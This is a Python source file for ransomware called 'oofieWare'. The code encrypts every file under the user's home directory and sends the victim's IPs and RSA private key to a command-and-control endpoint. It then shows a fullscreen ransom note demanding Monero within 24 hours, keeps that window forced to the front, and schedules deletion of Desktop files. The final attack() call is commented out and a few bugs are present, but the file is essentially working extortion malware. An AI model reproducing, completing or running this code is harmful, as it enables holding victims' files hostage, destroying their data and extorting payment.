import os
import subprocess
import shutil
from pathlib import Path
import pygetwindow as pg
import threading
import socket
import base64
import json
import requests
from time import sleep
from typing import Optional
from ctypes import wintypes, windll, create_unicode_buffer
import tkinter as tk
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

class oofieWare:
    def __init__(self, gen_rsa=True):
        self.key = None
        self.enc_key = None
        self.encrypter = None
        self.decrypter = None
        self.threads = []
        self.started = False
        self.testPoint = r'C:\Users\oofie\Desktop\Target' # for testing on a particular folder
        self.startPoint = os.path.expanduser("~")
        self.Desktop = os.path.normpath(os.path.expanduser("~/Desktop"))
        self.LARGE_SIZE = 50_000_000
        self.PUBLIC_IP = requests.get('https://api.ipify.org').text
        self.PRIVATE_IP = socket.gethostbyname(socket.gethostname())
        
        self.ENDPOINT = "<command and control server>"

        if gen_rsa:
            self.privKey = None
            self.pubKey = None
        else:
            self.pubKey = '' # insert default val

    def gen_sym_key(self):
        secure_pw = os.urandom(32)
        salt = os.urandom(16)

        kdf = PBKDF2HMAC(
             algorithm=hashes.SHA256(),
             length=32,
             salt=salt,
             iterations=500000,
        )

        self.key = base64.urlsafe_b64encode(kdf.derive(secure_pw))
        self.encrypter = Fernet(self.key)

    def gen_rsa_keypair(self):
        keyPair = RSA.generate(4096)
        self.privKey = keyPair.export_key()
        self.pubKey = keyPair.publickey()
        requests.post(self.ENDPOINT, data=json.dumps({
            "PUBLIC_IP": self.PUBLIC_IP,
            "PRIVATE_IP": self.PRIVATE_IP,
            "PRIVATE_KEY": self.privKey
        }), headers={"Content-Type" : "application/json"})
        self.privKey = None

    def crypt_file(self, file_path):
        try:
            if self.encrypter:
                enc_data = None
                with open(file_path, 'rb') as x:
                    data = x.read()
                    if data:
                        enc_data = self.encrypter.encrypt(data)
                        x.close()
                if enc_data:
                    with open(file_path, "wb") as y:
                        y.write(enc_data)
                        y.close()

            if self.decrypter:
                dec_data = None
                with open(file_path, 'rb') as x:
                    data = x.read()
                    if data:
                        dec_data = self.decrypter.decrypt(data)
                        x.close()
                if dec_data:
                    with open(file_path, "wb") as y:
                        y.write(dec_data)
                        y.close()
        except Exception as e:
            print(f"Error detected at {file_path}\n {e}") # for debugging purposes only

    def crypt_system(self):
        for root, dirs, files in os.walk(self.startPoint, topdown = True):
            for file in files:
                file_path = os.path.join(root, file)
                if not (os.stat(file_path).st_size > self.LARGE_SIZE):
                    self.crypt_file(file_path)
                else:
                    t = threading.Thread(target=self.crypt_file, args=(file_path,))
                    self.threads.append(t)
                    t.start()

    def wait_till_finish(self):
        for thr in self.threads:
            thr.join()

        self.threads = []

    def encrypt_key(self):
        self.encrypter = None
        enc_for_key = PKCS1_OAEP.new(self.pubKey)
        self.enc_key = enc_for_key.encrypt(self.key)
        self.key = None
        with open (f"{self.Desktop}/IDENTIFIER.TXT", "wb") as id:
            id.write(self.enc_key)
            id.close()

    def show_sym_key(self): # for debugging only
        with open(fr'{self.Desktop}', 'wb') as home:
            home.write(self.key)
            home.close()

    def show_ransom_window(self):

        SKULL = r'''
                         uuuuuuu
                     uu$$$$$$$$$$$uu
                  uu$$$$$$$$$$$$$$$$$uu
                 u$$$$$$$$$$$$$$$$$$$$$u
                u$$$$$$$$$$$$$$$$$$$$$$$u
               u$$$$$$$$$$$$$$$$$$$$$$$$$u
               u$$$$$$$$$$$$$$$$$$$$$$$$$u
               u$$$$$$"   "$$$"   "$$$$$$u
               "$$$$"      u$u       $$$$"
                $$$u       u$u       u$$$
                $$$u      u$$$u      u$$$
                 "$$$$uu$$$   $$$uu$$$$"
                  "$$$$$$$"   "$$$$$$$"
                    u$$$$$$$u$$$$$$$u
                     u$"$"$"$"$"$"$u
          uuu        $$u$ $ $ $ $u$$       uuu
         u$$$$        $$$$$u$u$u$$$       u$$$$
          $$$$$uu      "$$$$$$$$$"     uu$$$$$$
        u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
        $$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
         """      ""$$$$$$$$$$$uu ""$"""
                uuuu ""$$$$$$$$$$uuu
        u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
        $$$$$$$$$$""""           ""$$$$$$$$$$$"
        "$$$$$"                      ""$$$$""
            $$$"                         $$$$"
        '''


        DESCRIPTION = '''Your files have been encrypted with a military-grade encryption algorithm. You will not be able to access them,
        and NO ONE will be able to help you decrypt your files except for us.

        TO DECRYPT YOUR FILES:

        1. Pay $200 in MONERO to this address: o845v9o3cn4o38cvo7tvcno8t7v94nvc7t9848947c
        2. Email the file called "IDENTIFIER.txt" WHICH IS ON YOUR DESKTOP to oofiecybergroup@oofiecybergroup.com, along with screenshot of payment.

        If we can confirm that you paid, WE WILL SEND YOU THE KEY TO UNLOCK ALL YOUR FILES.

        IF YOU TRY TO PLAY ANY GAMES, OR IF YOU DON'T PAY WITHIN 24 HOURS,

        WE WILL THROW AWAY THE KEY. WE WILL DELETE ALL YOUR FILES. YOU WILL LOSE YOUR FILES FOREVER. 

        THE CLOCK IS TICKING'''

        window = tk.Tk()
        window.title('Ransom Note')
        window.attributes('-fullscreen', True)

        def countdown(count):
            # change text in label
            # count = '01:30:00'
            hour, minute, second = count.split(':')

            hour = int(hour)
            minute = int(minute)
            second = int(second)

            if self.started:
                countdownLbl['text'] = '{}:{}:{}'.format(hour, minute, second)
            else:
                countdownLbl['text'] = '{}:{}:{}'.format(hour, minute, '00')
                self.started = True

            if second > 0 or minute > 0 or hour > 0:
                # call countdown again after 1000ms (1s)
                if second > 0:
                    second -= 1
                elif minute > 0:
                    minute -= 1
                    second = 59
                elif hour > 0:
                    hour -= 1
                    minute = 59
                    second = 59
                window.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second)) 
        
        logoFrame = tk.Frame(bg='#000000')
        titleFrame = tk.Frame(bg="#000000")
        frame1 = tk.Frame(bg="#000000")
        frame2 = tk.Frame(bg="#000000")
        countdownFrame = tk.Frame(bg="#000000")

        skullLbl = tk.Label(text=SKULL, fg="#00ff00", bg="#000000", font="TkFixedFont", justify=tk.LEFT, master=logoFrame)
        skullLbl.pack(pady=5)

        titleLbl = tk.Label(text='OOFIE HAS SEIZED THIS COMPUTER', fg="#00ff00", bg = "#000000", font=('Arial', 20), master=titleFrame)
        titleLbl.pack(pady=5)

        mainPara = tk.Label(text=DESCRIPTION, fg="#00ff00", bg="#000000", font=("Arial", 12), master=frame2)
        mainPara.pack(pady=10)

        countdownLbl = tk.Label(fg="#00ff00", bg="#000000", font=("Arial bold", 30), master=countdownFrame)
        countdownLbl.pack()

        logoFrame.pack(fill=tk.X)
        titleFrame.pack(fill=tk.X)
        frame1.pack(fill=tk.X)
        frame2.pack(fill=tk.X)
        countdownFrame.pack(fill=tk.BOTH, expand=True)

        countdown("24:00:00")

        eraseTimer = threading.Timer(60*60*24, self.erase_system)

        eraseTimer.start()

        window.mainloop()

    def erase_system(self):
        for root, dirs, files in os.walk(self.Desktop, topdown = True):
            try:
                shutil.rmtree(os.path.join(root, dirs))
            except OSError as e:
                pass
            
    def elevate_ransom_window(self):

        # def getForegroundWindowTitle() -> Optional[str]:
        #     hWnd = windll.user32.GetForegroundWindow()
        #     length = windll.user32.GetWindowTextLengthW(hWnd)
        #     buf = create_unicode_buffer(length + 1)
        #     windll.user32.GetWindowTextW(hWnd, buf, length + 1)

        while True:
            topWindow = pg.getActiveWindow()
            if topWindow.title != "Ransom Note":
                try:
                    win = pg.getWindowsWithTitle('Ransom Note')[0]
                    win.minimize()
                    win.restore()
                except:
                    continue

            sleep(10) # take away completely to annoy the fuck out of victim

    def detect_dec_key(self):
        DECRYPT_FILE_PATH = Path(fr"{self.Desktop}/DECRYPT.txt")
        while True:
            try:
                if DECRYPT_FILE_PATH.is_file():
                    try:
                        with open(f"{self.Desktop}/DECRYPT.txt", "rb") as dec:
                            self.key = dec.read()
                            # print(self.key)
                            self.decrypter = Fernet(self.key)
                            print("Decrypting...")
                            self.crypt_system()
                            self.wait_till_finish()
                            break
                    except Exception as e:
                        print("Incorrect decryption key given.")
                        print(e)

            except Exception as e:
                pass

            sleep(5)

def attack():
    oof = oofieWare(gen_rsa = True)
    oof.gen_sym_key()
    oof.gen_rsa_keypair()
    oof.crypt_system()
    oof.show_sym_key() # for debugging purposes, DON'T use this line irl
    oof.wait_till_finish()
    oof.encrypt_key()
    elevate = threading.Thread(target = oof.elevate_ransom_window)
    elevate.start()
    detect = threading.Thread(target = oof.detect_dec_key)
    detect.start()
    oof.show_ransom_window()
    
# attack()
    
# DONT be a retard and run this by accident